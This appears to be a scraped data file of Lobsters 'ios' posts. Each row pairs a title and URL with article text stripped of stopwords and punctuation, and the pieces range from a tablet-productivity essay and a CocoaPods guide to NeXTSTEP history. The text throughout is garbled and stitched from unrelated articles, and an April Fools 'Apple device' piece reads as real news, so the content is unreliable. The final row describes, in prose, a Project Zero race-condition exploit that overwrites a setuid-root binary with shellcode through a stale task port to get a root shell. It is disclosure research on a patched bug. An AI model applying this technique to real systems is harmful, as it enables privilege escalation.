need special way web came along lot programmer worked hard turn screen clientserver frontends web page people wanted pffunction key clientside field validation added form crazy web site horrible whole metaphor different better best way adapt change avoid trying turn old thing new thingsok thing annoyingmy brain free willing unlearn year computing switch big phone keyboard attached fun easy course experience switching o full pc prior life mentioned motivatedwhat kind productivity everything laptop often receiving end work product lot people get pick tool use entrepreneur send document number format keynote pdf doc sheet word excel powerpoint tool document signingviewingsecuring information product site apps cloud storage product line business tool also lot work initiating creation across sort data type structured word image video communicate lot across dozen different tool write lot long post lot email make consume spreadsheet create deliver presentation use line business service lot thing data use web lot short use lot different software lot different stuffi yet experienced something go back laptopi found nothing missing want offer balance provide fodder debate list even important stuff since part shift everyone find thing drive nut thing could figure work around easily found annoying trying drive wrong side road ie arbitrary choice adjust found difficult commandtab list short switch apps via commandtab lot io limit item rather scroll list happen want switch something used much earlier get via home screen since always keep stack head sometimes end switching twice could slide scroll lot work trivial one continues interrupt flow nit hitapps always io apis implemented get using lot apps moving productivity information connection apps matter lot especially think everything file icloud drive support third party location box etc every app support going icloud drive get data source opposite share via share sheet share apps good share destination fact many apps curated set connection suspect change unlike early window apps use standard o dialog mostly many exist window xp rather convoluted attach file within apps many talk pdf problem applies sort email attachment want edit get back reply message try cloudonly external connection attachment often preferred android native file system work around limit also open complex legacy namespace regular people ever seecopypaste copy paste huge invention move graphical o time recall bumpy road one constantly battled clipboard format whether pair apps could talk dib bmp unicode http aspx tablet web eliminated still lot apps make easy copy paste social apps web site notorious regard apps good consuming formatted text image clipboard likely changescreenshots screenshots something seen dramatic rise use smartphones become universal clipboard format window use addins onenote mac great screen capture since smartphones tablet still brute force full screen like window addins select region prevent adding screen photo capturing using region screen take lot step end image photo roll one imagine everyone apple wrestle maybe get fixed soon also hope someone us exifmeta data make easy automatically capture alttext accessibilityreaderscloud storage fragmentation go tablet really want need go cloud huge positive lose drop tablet upgrade without worry lost time switch tablet phone never even think file laptop many people use desktop work file area b feel need keep everything time performance latency etc people cloud fix except practical matter end floating many cloud time say new problem course anyone worked company plethora file server sharepoints cloud storage already fragmentation problem new tablet new break cloud making local copy set related work product convenience word fool solving problem creating massive security issue solve create temporary cloud solution desktop break security ruleskeyboard handling even though io based o x code keyboard part ipad since launch uneven handling basic stuff like keyboard focus tab shortcut lot apps even ipad lot bug keyboard handling manifest thing like stuck field unable leave without touch copy failing commandc trapped suspect apps testing broadly keyboard android similar issue know reminds window apps test color screen without mousethese thing wrestled month none deal breaker committed frankly empathy app maker platform maker many even new used ipad mini keyboard many month came consistent android tablet experience well also limitation apps site one run across mobile browser experience delivered tablet transitioned web first time totally normal wager everyone product trying get full experience mobile o fast possible whether mobile browse app yet experienced something go back laptop thing surprised thought would work example signing legal document sure find thing soonok thing much easierso clearly problem also longer list thing improved daily work switching tablet might surprise given underlying trend believe case others simply confirm biasflow social apps laptop clearly two type tab browser newssocial tab work tab apps mostly contained one app browser o way switching app switching kind awkward switching alttab ctrltab commandtab command tablet one model switching metacontexts everything app find moving much flow thing feel much elegant fact social news site apps focusing energy make benefitweight connectivity instant onoff small bag paper notepad weighs tabletkeyboard carry hotspot use phone battery drive wifi keyboard device walk hall laptop open avoid going standby worse hibernate everything carry weight connectivity onoff vastly improvedsecond screen even using laptop desktop people using second compute screen forever amazing many people still use calculator using excel smartphones second screen many people hold using tablet even though computer type close cousin form factor use phone phone thing get lyft typing email avoid context switch working different pc somewhat better overall context much closer clear model find thisdifferent apps like two devicessecond screen way feel like two different device put apps phone phone thing phoneonly thing put ondemand service apps tablet reservation transportation etc productivity apps phone though often scan thing go quickly share thing mobile definitely rely aspect io continuity great balance different context across device love able use messaging apps keyboard since many people work messaging replaced emailno window management futzing longer dread restart failed resume standby messing window spend energy arranging thing anywhere everyone say full screen difficult think time saved futzing long known people run apps full screen laptop anyway worry every person complains full screen apps full screen mode laptop software writing tool minimize distraction anyway one could expand futzing general difference pc o mobile o start flame war much like giving manual transmission selfinflicted oil changespresentations tablet great presentation carry fireside chat holding running thing exactly creating using airplay easy place go carry dongle hdmi need laptop use anyway ability drop keyboard overall device sizeweight make one great scenario love note handy well socially acceptable formphotos aspiring amateur photographer used every organizer editor year part transition trying thing native way found incredibly easy take photo import storage card edit using variety tool really love ability easily combine photo phone camera several camera well photo sent one album show across device easily surprise given much wedded old way workingdon worry local file ever laptop force worry file apps default local storage easy create backup problem without thinking solving sync engine drain battery seems suboptimal tablet mess big relief one security hole closed basically think local file create copy security problem stick cloud appsuniversal charging carry charger around even day coasttocoast flight full day writing problem battery life please debate battery life really cool find charger andor charge cable anywhere hotel alarm clock charge tablet lyft driver offer cable buy chargercable walgreens need remotest part africa find cable solar travel third party two port charger two cable never worry plus put lowcost charger different place work without significant capital expense next many jury still shift know many people job require specific tool work product done tablet many part corporate culture take time effort evidence change view shift full swing quickly see world many many people tablet first tablet onlyas maker early essential otherwise latethe biggest change happen tablet platform apps change happened need happen cultural change permit technology change happenin old business culture communicated bos team person meeting printed memo stuffed interoffice mailbox email invented year ago become part mainstream corporate culture late early tool change one thing really changed people worked expectation communication took decade change started happening became normal someone level send mail bos fire incomplete thoughtidea send rough draft document many people seen limitation defect became positive technology shift hard overstate huge change timethe shift new form factor new platform bring cultural change take advantage perceived disadvantage maker early essential otherwise late steven sinofsky stevesi
383,Lobsters,ios,Apple iOS,"Cocoapods iOS frameworks with storyboards, nibs and resources",https://medium.com/tapglue-stories/cocoapods-ios-frameworks-with-storyboards-nibs-and-resources-4d354b843148,cocoapods io framework storyboards nib resource,cocoapods io framework storyboards nib resource tapglue element setup let get started hooking pod app adding image mix download image tip tapglue element wrapping tapglue element,cocoapods io framework storyboards nib resourcesfor last month working creating tapglue element framework io integrating full feature third party apps includes gui graphical asset like image also interacting current sdk responsible networking caching one fundamental requirement support biggest dependency management tool io cocoapodstoo big surprise many example framework something similar goal create full feature design ux integrated third party apps similar example found actually avoided using storyboards xib file together view purely codein post goal create stepbystep guide create framework storyboards xibs asset localisation work cocoapods project containing code found heresetupto start recommend using cocoapods template creating framework runningpod lib create myframeworkyou find documentation herewe using swift demo app sake simplicity use test frameworksthis set framework connected demo application use try framework case look like also generates podspec u leave way islet get started let start creating storyboard view controller tableview embed view controller uinavigationviewcontroller make navigation view controller initial view controllerwe link view controller create called frameworkvc spice thing implement cell xibs name ourcellxib assign reuse identifier ourcellnow let look combine together view controller import uikitpublic class frameworkvc uiviewcontroller iboutlet weak var tableview uitableview override public func viewdidload superviewdidload let podbundle nsbundle forclass frameworkvcself let bundleurl podbundleurlforresource myframework withextension bundle let bundle nsbundle url bundleurl let cellnib uinib nibname ourcell bundle bundle tableviewregisternib cellnib forcellreuseidentifier ourcell tableviewestimatedrowheight tableviewrowheight uitableviewautomaticdimension extension frameworkvc uitableviewdelegate extension frameworkvc uitableviewdatasource public func tableview tableview uitableview cellforrowatindexpath indexpath nsindexpath uitableviewcell return tableviewdequeuereusablecellwithidentifier ourcell public func tableview tableview uitableview numberofrowsinsection section int int return load xib file need use bundle associated framework hence viewdidload ask bundle frameworkvc get bundle name declared podspec point need head podspec update include storyboard xib filepod specnew sname myframework sversion ssummary short description myframework sdescription desc desc shomepage http githubcom githubusername myframework sscreenshots slicense mit sauthor john nilsen john tapgluecom ssource git http githubcom githubusername myframeworkgit tag sversiontos ssocialmediaurl http twittercom twitterusername splatform io srequiresarc true ssourcefiles podclasses swift sresourcebundles myframework podclasses storyboard xib endthere two significant change one side filter source file extension adding swift since putting storyboards nib class folder changed resourcebundle podclasses storyboard xib head example app executes pod install xcode storyboards xibs displayed different group resourceshooking pod appsince framework need hook demo app able see result work let start adding segue view controller add new class myframework add segue callimport uikitpublic class myframework public static func performseguetoframeworkvc caller uiviewcontroller let podbundle nsbundle forclass frameworkvcself let bundleurl podbundleurlforresource myframework withextension bundle let bundle nsbundle url bundleurl let storyboard uistoryboard name frameworkstoryboard bundle bundle let vc storyboardinstantiateinitialviewcontroller callerpresentviewcontroller vc animated true completion nil see wrote exact code getting bundle tidy create method generate u inside myframework classstatic var bundle nsbundle let podbundle nsbundle forclass frameworkvcself let bundleurl podbundleurlforresource myframework withextension bundle return nsbundle url bundleurl refactoring tidy myframework frameworkvcthats hook demo app head viewcontroller example myframework folder need add segue call viewdidappearimport uikit import myframeworkclass viewcontroller uiviewcontroller override func viewdidappear animated bool myframeworkperformseguetoframeworkvc self running ti see something like adding image mixlets improve cell design adding image first create asset catalog class folder myframework press plus add image set add following imagesdownload imageslets redesign cell look like thisif run pod install project would break need add new file resource bundleour podspec look something like fixing issue pod specnew sname myframework sversion ssummary short description myframework sdescription desc desc shomepage http githubcom githubusername myframework sscreenshots slicense mit sauthor john nilsen john tapgluecom ssource git http githubcom githubusername myframeworkgit tag sversiontos ssocialmediaurl http twittercom twitterusername splatform io srequiresarc true ssourcefiles podclasses swift sresourcebundles myframework podclasses storyboard xib xcassets json imageset png endnotice resourcebundle includes extension like xcassets json imageset png addition one earliernow run pod install example folder set tipssome minor issue ran related pod updated executing pod spec lint usually solved pod cache clean executing pod spec lint againwhen writing framework like would recommend providing view controller segue provide delegation relevant part view controller thats approach decided use tapglue elementswrapping upthats want example implement recommend read tapglue element source code
384,Lobsters,ios,Apple iOS,Apple Watch battery-strap accessory killed thanks to watchOS update,http://pocketnow.com/2016/04/18/apple-watch-battery-strap-accessory,apple watch batterystrap accessory killed thanks watchos update,learned little data port hiding one strap connector smartwatch ended keeping interface final form learned thirdparty company interested taking advantage connector reserve strap macrumors,shortly apple watch went sale last year learned little data port hiding one strap connector first seemed like hardware might reserved development model smartwatch ended keeping interface final form apple offer consumerfacing us port long learned thirdparty company interested taking advantage connector form batteryboosting reserve strap tapping pin strap supposed help recharge apple watch use extending time wired charging session unfortunately reserve strap hit insurmountable obstacle apple watchos update blocked ability function day back reserve strap team posted update progress informing preorder customer bad news change way software able access apple watch accessory port rendered reserve strap inoperable longer capable powering smartwatch team optimistic apple taking step may hint future official support band communicate smartwatch port apple yet commit anything along line entirely possible apple locking thing plan ever formally support something like reserve strap building product around notofficiallysupported interface always gamble especially dealing controlloving apple time look like reserve strap rolled dice lost source reserve strap via macrumors
386,Lobsters,ios,Apple iOS,"How I got 10,000 five-star reviews in 4 weeks",https://medium.com/@warpling/how-i-got-10-000-five-star-reviews-in-4-weeks-5246cc4c55c7,got fivestar review week,wait rewarding review well n ot section used cover incentivizing review apple reached clarify rewarding review fall updated section reflect app review guideline quora cult mac article blackbox review booting apps incentivized watching video ad lesson learned user prerogative key circa nail something give back personal appeal timing timing timing provide mean feedback dan counsell great example hunt reviewer twitter review twitter one star review launchkit appfigures,complement thank want hard encourage someone met help without offering something return building rapport begin letting voice hiding behind madeup company royal people seem far forgiving empathetic connect person team offering reward final cherry top allwait rewarding review well section used cover incentivizing review apple reached clarify rewarding review fall inappropriate method updated section reflect app review guidelinesdevelopers attempt manipulate cheat user review chart ranking app store fake paid review inappropriate method removed io developer programpreviously thought christian heidarson clarified well reward user leaving review app store manipulate ranking since user leave poor review without knowledge indeed return app without left review without knowledge source quora cult mac article photo source weiboif read blackbox review definitely fake paid rank manipulation happening time via incentivized downloads network cross promotion voting ring review exchange network oh wall iphones seemed homebaked idea might allowed unfortunately notmaybe stance change future though remember apple booting apps incentivized watching video ad lesson learneduser prerogative keywe may lost ability spot predatory animal periphery become remarkably adept hitting tiny close x dismissing uialertviews ease abandon day dress something native alert view best assume never readrather prompt opt intriguing button placed catch eye someone mode middle editing playing circa nail remember everyone need advocate fewer exuberant review quickly shadow many halfhearted one fewer people nagged leave review begin gladlyhave something give backit one thing give thanks another give token thanks gesture count bake confetti find fun gif make personal appeal go way others eager respondpersonal appealif small solo team might worth getting behind brand thing going well poorly little lose might surprised extra empathy understanding affords youtiming timing timingfind compelling moment reveal review option people love app find way measure moment hook measured time show rating option make sure interrupting anythingprovide mean feedbackwhat unhappy review people flow like water path least resistance better provide easier way reach thing start going south dan counsell illustrates great example prepare hunt reviewer fun easythe review review helpful people considering getting app great motivation get work every day lot fun reposting favorite twitter including one star review thanks launchkit appfigures review monitoring tool
387,Lobsters,ios,Apple iOS,Apple Introduces Their Answer To The Raspberry Pi,http://hackaday.com/2016/04/01/apple-introduces-their-answer-to-the-raspberry-pi/,apple introduces answer raspberry pi,user experience downside apple benchmark verdict,today apple announced latest bit hardware following tradition raspberry pi beaglebone intel edison apple released single board computer meant embedded internet thing application called apple device sure game changer field lowpower internetenabled computing first spec apple device us apple chip dualcore cpu found iphone cpu clocked ghz come equipped ram emmc flash io includes mini displayport capable driving display bluetooth usb massive break apple zeitgeist last decade apple device also includes forty pin header expansion much like raspberry pi beaglebone edison although apple first foray embedded computing market shocker retrospect come surprise introduction homekit io laid groundwork internet apple device embedded toaster refrigerator smart home car apple device life expectation handson experience like see review apple device break first question anyone ask discussing apple internet thing board operating system run far pressing concern need purely graphical o headless machine want o locked proprietary cruft course idea apple built upon proprietary locked operating system myth io mac o built darwin open source kernel based bsd core deviceos booting device terminal le provides everything could ever need tiny single board computer apple committing purely command line board though apple built computer like year mini displayport apple device course mean gui obviously capable full feature o x useful io either compare chromebook enough job much else user experience using apple device dead simple plug usb cable open terminal apple device intended run headless time fact apple expects set device power device need connect device computer open terminal drop device shell access entire unixey subsystem wifi credential set unplug device computer plug micro usb charger device connected internet usb port power also way connect keyboard mouse peripheral usb thumb drive however need apple powered device usb hub sold separately break usb four usb type port backpowering apple device brilliant physical user interface device run headless time still requires port useful course running apple device headless need connect monitor mini displayport come boot device powered device usb hub plug monitor presented desktop really o x really io either minimal almost chromebookesque o look little bit like o x right program available deviceos homekit app safari browser playing around setting want look something internet click safari icon want change wifi address device name go setting configured desktop see brilliance apple device desktop computer neither chromebook considering people work web gamechanging device combine apple icloud something exceptionally popular downside apple apple hand lot cookie jar apple tv device streaming video music tv giving apple device functionality would cut sale apple tv since apple device sell le apple tv would bad move even apple sitting billion cash also even though apple device header right board documentation anywhere pin used raspberry pi header well documented used everything environmental sensor vga audio output apple make mention pin although expect shield released short order benchmark built around apple chip apple device extremely capable especially compared assumed competitor raspberry pi intel edison term raw horsepower apple device handily beat raspberry pi intel edison expected chip apple device extremely powerful beat single board computer handily graphic gpu raspberry pi huge reason board popular able stream movie apple device would mean apple tv quickly taken production acceleration better come encoding apple device fall little short even compared rather sluggish raspberry pi zero apple device match berry board purely speculation suspect encoding disabled apple device reason clear apple already sell single board computer meant streaming video tv giving apple device capability apple tv would cut market sadly look like video capability apple device limited digital signage disappointing given apple strategy last twenty year unexpected look forward eventual hack root exploit unlock powerful graphic capability chip already verdict right bat apple device amazing piece hardware incredibly small lot computational power work homekit device already ability plug computer tiny nix device connected internet great comparing user interface raspberry pi beaglebone intel offering even fair comparison apple taken best design entire product line anyone including engineer tech literati would find useful however glaring limitation apple device decoding big one popular use case raspberry pi seems setting retro game emulator streaming video network apple apple device would probably cut market apple tv another shortcoming issue header right documentation whatsoever small pin header located board find anything nix system relating peripheral might connected pin event pin mm pitch making hard plug scope meter onto one pin mating connector anyone seen connector wild love hear comment apple done different raspberry pi armpowered single board computer released recent year taken cpu smartphone year old added peripheral slapped board nothing new exactly raspberry pi raspberry pi clone banana pi odroid hardware somewhat predictable software really shine built io given device designed run headless time used purely command line making perfect device internet thing also tiny desktop computer somewhat usable given power chip since apple device sell apple really hit park one despite obvious obvious shortcoming really looking forward apple taking popularity raspberry pi single board computer next level device quick aside noted apple device technically apple second single board computer first apple product apple released would today fall market raspberry pi beaglebones apple device take launch apple date apple founded april today anniversary first apple product apple museum piece finest example apple innovation year apple device follows tradition nearly guaranteed held high regard board came steve garage
388,Lobsters,ios,Apple iOS,Tribe - Experiential Messaging,http://tribe.pm/,tribe experiential messaging,,
389,Lobsters,ios,Apple iOS,"The Deep History of Your Apps: Steve Jobs, NeXTSTEP, and Early Object-Oriented Programming",http://www.computerhistory.org/atchm/the-deep-history-of-your-apps-steve-jobs-nextstep-and-early-object-oriented-programming/,deep history apps steve job nextstep early objectoriented programming,sir tim bernerslee cern used create worldwideweb robert taylor chuck thacker butler lampson bob metcalfe lynn conway charles geschke john warnock chm fellow alan kay chm revolution exhibit source code chm released job revealed actually missed glimpse two parc technology xerox ethernet macintosh revolution making easier end user software developer paid bear develop look time take make gui user interface take time would reduce time developer create application user interface macworld presentation line code developer could write maintain never break user line code developer never write read using metaphor building job brilliantly explained comparative advantage nextstep appkit developer could eliminate code graphical application share common allowing focus code made app unique provided additional value user fireside chat apple may worldwide developer conference nextstep technology provided five ten time speed improvement implementing existing apps create something entirely new could developed platform initially coda collection next software including nextstep openstep enterprise object framework webobjects hhsu computerhistoryorg note reference http,since hundred billion apps downloaded apple app store onto user iphones ipads thousand software developer written apps apple io mobile platform however technology tool powering mobile app revolution new rather long history spanning thirty year one connects back next company steve job started beginning software engineering objectoriented programming late next cube masterpiece expensive next evolved software company cube several next hardware product failed marketplace next greatest innovation nextstep operating environment chm apple io based desktop operating system mac o x importantly io software development kit sdk known cocoa touch based principle foundation mac o x desktop sdk cocoa sdk set tool software library application developer use build apps commonly come form application program interface apis interface call function provided platform builtin library o x cocoa first shipped march turn based nextstep originally capitalized nextstep operating development environment next founded steve job upon resigning apple stripped power following attempted boardroom coup nextstep next computer state art computer expensive education market next targeted hardware business flagging next forced close factory becoming software company focused custom application development enterprise nextstep development platform renamed openstep ported hardware operating system including intel processor sun workstation apple dire strait needed replace aging mac o modern robust operating system failing produce one apple acquired next order make nextstep basis eventually became mac o x january annual macworld expo trade show steve job triumphantly returned onstage apple employee first time since time explain thought apple needed survive become great nextstep technology could help apple achieve video job demonstrates openstep macworld expo january short presentation macworld expo january job demonstrated technology would become cocoa software development system would eventually used thousand io app developer around world steve job showing apple developer future would look like one indeed today io developer would find remarkably similar everyday experience fact job showing apple developer new released next almost decade earlier video steve job introduces nextstep objectoriented development environment world indeed nextstep productive development environment year next computer revealed sir tim bernerslee cern used create worldwideweb tim bernerslee first web browsereditor running nextstep made next development environment ahead time macworld demo job told little parable point time well known computer industry job got idea macintosh graphical user interface team apple visited xerox parc parc palo alto research center bluesky computer research lab started xerox create office future parc staff led chm fellow robert taylor leading computer scientist day among chm fellow chuck thacker butler lampson bob metcalfe lynn conway charles geschke john warnock among luminary chm fellow alan kay kay envisioned dynabook tabletlike computer would dynamic medium learning thacker lampson designed technology available time interim dynabook might partially make real kay idea result alto personal workstation designed single user running world first graphical user interface gui window icon menu controlled using mouse xerox alto visitor see chm revolution exhibit much whose source code chm released public progenitor way almost desktop computer user interact machine today xerox alto chm macworld demo job revealed actually missed glimpse two parc technology critical future one pervasive networking personal computer xerox ethernet invented every one alto workstation new paradigm programming dubbed objectoriented programming alan kay kay working dan ingalls adele goldberg designed new programming language development environment embodied paradigm running alto kay called system smalltalk intended simple enough child use program would consist object modeled thing real world animal vehicle differed traditional procedureoriented procedural programming routine procedure operate data input stored separately smalltalk object consisted data grouped together routine method operated data kay imagined program dynamic system object sending message object receiving message would use select many routine method run message sent different object would result receiving object executing routine different others example dog object cat object would respond speak message differently dog would run bark method cat would run meow method smalltalk development environment graphical window menu fact smalltalk exact gui steve job saw smalltalk gui composed collection interacting object discussed example window object could sent message draw would forward object inside including button slider object would particular method drawing job visit parc enthralled surface detail gui completely missed radical way created object result programming graphical application macintosh would become much difficult smalltalk said job introduction next computer macintosh revolution making easier end user software developer paid bear develop look time take make gui user interface take time graphical user interface gui development environment circa courtesy parc library next computer job planned fix exact shortcoming macintosh parc technology missing mac would become central feature next next computer like workstation designed live permanently networked environment job called interpersonal computing though simply renaming xerox thacker lampson called personal distributed computing likewise dynamic objectoriented programming smalltalk model provided basis software development nextstep according job nextstep would reduce time developer create application user interface instead using smalltalk however next chose objectivec programming language would provide technical foundation success next apple software platform next two decade beyond objectivec remains use apple today io o x development though apple introduced new swift language may one day replace objectivec created brad cox add smalltalkstyle objectorientation traditional procedureoriented c significant advantage smalltalk program written smalltalk could stand alone run smalltalk program installed along entire smalltalk runtime virtual machine much like java program today meant smalltalk resource intensive using significantly memory running often slower comparable c program could run also like java smalltalk program user interface convention looking feeling different application native environment run udell reimplementing smalltalk idea c cox made possible objectivec programmer organize program architecture using smalltalk higher level abstraction finetuning performancecritical code procedural c meant objectivec program could run fast traditional c program moreover need installed alongside smalltalk virtual machine memory footprint comparable c program fully native platform would look feel application system cox benefit objectivec program fully compatible c could utilize hundred c library already written unix platform particularly advantageous next nextstep based unix could get leg program could run developer could simply wrap existing c code base new objectoriented gui fully functional application objectivec hybrid nature allowed next programmer best smalltalk c world value would combination software developer early computer professional complaining software crisis widely distributed graph predicted cost programming would eclipse cost hardware software became ever complex slayton pp famously ibm project shipped late overbudget horribly buggy ensmenger pp slayton pp ibm produced report claiming best programmer anywhere twentyfive time productive average programmer ensmenger p programmer frequently optimizing machine code clever trick save memory time said practitioner black art ensmenger p thus impossible manage concern great nato convened conference computer scientist garmisch switzerland see software programming could turned discipline like engineering wake debacle chm fellow fred brook ibm manager charge wrote seminal text software engineering mythical manmonth brook famously outlined became known brook software team reach certain size thus complexity software increase adding programmer actually increase cost delay release software brook claimed best developed small surgical team led chief programmer responsible architectural decision subordinate implementation brook problem cost complexity software remained unsolved appeared software industry might perpetual state crisis brook revisited thesis claimed despite modest gain improved programming language single technology silver bullet could increase programmer productivity order improvement would elevate average programmer level exceptional one brook brad cox begged differ cox argued objectoriented programming could used create library software object developer could buy offtheshelf easily combine like lego set create program fraction time interchangeable part led original industrial revolution market reusable offtheshelf software object would lead software industrial revolution cox cox objectivec language test bed vision cox started company stepstone sell library object developer steve job engineer next saw cox vision largely compatible licensed objectivec stepstone stepstone later next engineer steve naroff heavy lifting modify language compiler next rather buy library stepstone next developed set object library using objectivec bundled kit nextstep operating system part software development environment central graphical user interface library next developer used construct application applicationkit appkit conjunction appkit next created visual tool called interface builder gave developer ability connect object program graphically part macworld presentation job demonstrated easily one could build app using interface builder process familiar io developer today job simply dragged text field slider palette window dragged slider text field make connection selecting command one object send result text field hooked slider displaying realtime numerical value slider position represented job demonstrated without writing single line code driving home point line code developer could write maintain never break user line code developer never write today appkit still primary application framework o x io uikit heavily modeled interface builder still exists part apple xcode integrated development environment ide combination objectivec appkit interface builder allowed steve job boast nextstep could make developer five ten time order magnitude improvement brook claimed could achieved job assumed audience macworld familiar brook read mythical manmonth told audience software team getting bigger sort collapse weight like building built wood build building built wood high using metaphor building job brilliantly explained comparative advantage nextstep appkit programming do equivalent starting ground floor argued app developer might add three floor functionality achieve four floor capability classic mac o toolbox apis effectively raised foundation fifth floor allowing developer reach eight floor functionality job said enabled creation killer application like pagemaker mac conjunction laser printer much create entirely new market desktop publishing job insisted capacity developer enable new kind application apple platform simply could exist apple needed foster survive grow problem job continued microsoft window caught mac window nt effectively provided seventh floor base outcompeting mac job saw next coming apple rescue nextstep interface builder tool along appkit objectoriented library provided much rich functionality box raised developer twentieth floor claimed job meant developer could eliminate code graphical application share common allowing focus code made app unique provided additional value user result job insisted would small team two ten developer could write app fully featured hundredperson team working large corporate software company like microsoft argue vision outlined job fact remarkably similar fred brook notion programming small surgical team led chief programmer difference rather chief programmer delegate grunt work subordinate coder brook described job vision work handled library object actuality cox vision except whereas cox intended object purchased open market next bundled object library part nextstep operating system development environment might actually inhibit formation aftermarket object vision cox job grunt work making application offloaded developer object nobody small team needed mere implementer forced work program foundation unlike procedural code unit precisely blackboxed encapsulated nature prevented programmer tampering enforced modularity allowed reused interchangeably developer standing given floor simply allowed mess foundation stood freed worrying internal detail object developer could focus creatively rewarding work design architecture purview chief programmer brook scheme team member would start twentieth floor collaborate equal effort would continue build upward rather diverted redoing floor upon stood promise improvement pipe dream already seen nextstep used rapid prototyping tool create first version worldwideweb though nextstep found large user base well received programmer especially academia also diehard community thirdparty next developer backing job product small shop like omnigroup lighthouse design stone design team larger eighteen case lighthouse single man case stone written fully featured application spreadsheet presentation software web browser graphic design tool moreover nextstep proved productive rapid development missioncritical custom application wall street bank national security organization like cia paying thousand dollar per license six month later fireside chat apple may worldwide developer conference job said lighthouse since acquired sun proved nextstep technology provided five ten time speed improvement implementing existing apps moreover compelling advantage nextstep would allow innovative developer create something entirely new could developed platform initially could replicated platform without huge effort nextstep tim bernerslee used create worldwideweb dell used create first ecommerce website nextstep objectoriented development environment would power innovation apple platform well twentyfirst century looking back perspective steve job remarkably prescient mac o x shipped macintosh personal computer smallscale former next developer shareware mac developer alike began write apps using appkit interface builder called cocoa developer taking advantage ecommerce web began call independent indie software developer opposed large corporate concern like microsoft adobe hundredman team apple opened iphone thirdparty software developer created app store enabling developer sell distribute apps directly consumer mobile device without set server payment system app store became ground zero new gold rush software development inviting legendary venture capitalist firm kleiner perkins caulfield byers set ifund fund mobile app startup wortham time indie mac developer like andrew stone wil shipley predicted cocoa touch app store would revolutionize software industry around million smallscale developer unfortunately year since utopian dream slowly died unicorn acquisition big corporation moved mobile market matured squeezing little guy refuse investor funding hundred competitor app store extremely difficult get one app noticed without expensive external marketing reality majority mobile developer sustain living making apps profitable developer contractor writing apps large corporation nevertheless objectoriented technology job demoed today basis every iphone ipad apple watch apple tv app steve job predict future alan kay famously said best way predict future invent cyberpunk author william gibson noted future already evenly distributed next already invented future back next never shipped computer handful lucky enough glimpse steve job needed return apple distribute future rest world coda today silicon valley focus innovation future deep history technology apple cocoa development environment often forgotten however understanding past vitally important inventing future chance future already invented one need little digging computer history museum mission preserve past physical hardware number next computer peripheral also software soul machine chm small collection next software including nextstep openstep enterprise object framework webobjects cd lacking earlier version nextstep little way next application filling collection important software contextual link computer user institution society embedded software history organization social relationship made tangible computing historian nathan ensmenger written ensmenger p thus beyond preservation also vital make meaningful story computer software legacy contextualize culture time first blog post chm curator new software history center mark beginning project collect interpret material software oral history related graphical user interface objectoriented programming software engineering starting focus next apple xerox parc look forward story like space former next apple xerox parc engineer would like contribute project please contact hhsu computerhistoryorg note objectivec work brad cox alone might become obscure footnote history programming language steve job next computer chosen basis programming nextstep cox cofounded stepstone originally called productivity product international ppi tom love promote objectoriented solution could coexist existing language objectivec originated objectoriented precompiler first version language called objectivec still used separate c preprocessor translate objc code straight c handing compiler however version language compiler insufficient next purpose took contribution steve naroff others make objectivec language know today see note tailor objectivec next need stepstone engineer steve naroff took development cox made significant addition language support next visual programming tool interfacebuilder naroff work important eventually hired steve job next later stayed apple naroff integrated objectivec directly c compiler next using open source gnu c compiler gcc working closely richard stallman eliminated separate translation step support interfacebuilder naroff added key feature language category known today class extension way dynamically add method existing class without subclassing another key feature called protocol later added next engineer bertrand serlet later became apple software vice president blaine garst later led java team apple protocol allow class inherit multiple interface specification without inheriting implementation circumventing conflict occur multiple class inheritance language like c feature later adopted java interface two feature category protocol made possible several key design pattern heavily used next appkit class library became impossible later year think objectivec without addition many contribution objectivec next engineer necessary driven practical need next developer realworld use rather need computing researcher kevin enderby worked linker assembler naroff solved method fragility problem affected dynamic library compatibility added explicit declaration construct import directive c integration serlet added method forwarding enable remote object proxy garst worked objectivec runtime key advocate referencecounted memory management modification laid groundwork objectivec longevity next later apple providing solid foundation would eventually power mac o x iphone development present day reference brook frederick p silver bullet essence accident software engineering computer mythical manmonth essay software engineering anniversary ed reading addisonwesley pub co cox brad j object oriented precompiler programming smalltalk method c language sigplan silver bullet software industrial revolution based reusable interchangeable part alter software universe byte october planning software industrial revolution ieee software objectoriented programming evolutionary approach ed reading addisonwesley pub co ensmenger nathan l computer boy take computer programmer politics technical expertise cambridge mit press slayton rebecca argument count physic computing missile defense cambridge mit press udell jon enters ninety byte october wortham jenna iphone gold rush new york time april http
390,Lobsters,ios,Apple iOS,Race you to the kernel!,http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html,race kernel,,posted ian beer google project zero o x io kernel code responsible loading setuid root binary invalidates old task port first swapping new virtual memory map pointer old task object leaving short race window manipulate memory euid process old task port invalidated going step also allows also gain entitlement o x load unsigned kernel extension reported bug apple december patched o x technical detail see original bug report also grab updated exploit task port ever tried use ptrace o x probably sorely disappointed whilst syscall exists severely limited example support peeking poking memory pretty fundamental usecase one many area xnu duality kernel evident along ptrace parallel abstraction layer mach side kernel support building debugging tool via set special mach task port process executing o x task port example allocate page memory process might use code like machvmaddresst addr machvmallocate machtaskself addr vmflagsanywhere machvmallocate mig method implemented kernel defined machvmdefs xnu kernel source first argument method current task port happened send right another task task port call method passing task task port allocation would end task virtual address space even though task made call similarly machvmread machvmwrite method allow read write memory process task port effectively giving complete control default task send right task port easy give process send right task port using standard mach messaging mechanism execve usually new task port created new process created via fork posixspawn execing new binary reset task port lead obvious question since send right process task port give complete control process deal suid binary exec call increase privilege process looking exec code find snippet mach reset task thread port nt want anyone port setuid exec able accesscontrol taskthread ipctaskreset p task sound sensible execve really complex syscall lot going diagram outline four major phase exec syscall interested along lifetime data structure phase old task port still valid via task struct give u access old vmmap still contains virtual address space task prior exec part loadmachfile method kernel create new vmmap load new executable image note though point new vmmap matched task virtual address space process phase parsemachfile method actual parse load macho image new virtual address space also phase code signature binary checked come back detail later phase loadmachfile call swaptaskmap set task struct point new vmmap target executable loaded point machvm method invoked old task port target new vmmap phase exechandlesugid check binary suid reset task port point old task port longer work somethings right highlevel view clear fundamental race condition phase vmmap swapped phase task port invalidated full readwrite access via old task port new vmmap containing loaded binary executed even suid mean use machvmwrite overwrite text segment code control diagram hard tell actually quite long period two phase certainly enough time sneak mach kernel mig call building reliable exploit one small stumbling block overcome though although try write new vmmap write userspace aslr o x binary dynamic library randomized perexec first figure kernel loaded image luckily task port lot blindly read write new vmmap also api like machvmregion ask property memory region map case loop constantly asking address lowest mapping change know changed base address image new vmmap race window phase using base address work address binary entrypoint new vmmap mark page rwx using machvmprotect overwrite shellcode using machvmwrite run rootshellsh attached exploit see action work box semirecent o x system using otool extract entrypoint suidroot executable going codesigning entitlement exec phase diagram mentioned 